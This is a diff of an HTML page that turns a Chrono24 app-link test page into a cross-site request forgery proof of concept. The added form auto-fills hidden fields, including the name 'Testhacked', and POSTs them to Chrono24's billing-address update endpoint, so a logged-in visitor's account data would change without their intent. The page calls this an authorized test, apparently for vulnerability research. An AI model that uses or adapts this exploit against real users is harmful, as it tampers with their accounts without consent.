@@ -3,14 +3,31 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Chrono24 App-Link Test</title>
+  <title>Chrono24 CSRF Test</title>
 </head>
 <body>
-  <h2>Chrono24 Android App-Link Test</h2>
-  <p>Tap the button to try opening Chrono24.</p>
+  <h2>Chrono24 Test</h2>
+  <p>Open the Chrono24 app, then return here to run
+     the authorized browser-side test.</p>
 
   <a href="https://www.chrono24.com/">
-    Open Chrono24
+    Open Chrono24 app
   </a>
+
+  <form
+    action="https://chrono24.app/api/user/update-billing-address.json?SETLANG=en_US&amp;SETCURR=USD"
+    method="POST">
+
+    <input type="hidden" name="city" value="">
+    <input type="hidden" name="country" value="">
+    <input type="hidden" name="firstName" value="Testhacked">
+    <input type="hidden" name="lastName" value="">
+    <input type="hidden" name="region" value="">
+    <input type="hidden" name="street1" value="">
+    <input type="hidden" name="street2" value="">
+    <input type="hidden" name="zipCode" value="">
+
+    <button type="submit">Submit browser test</button>
+  </form>
 </body>
 </html>
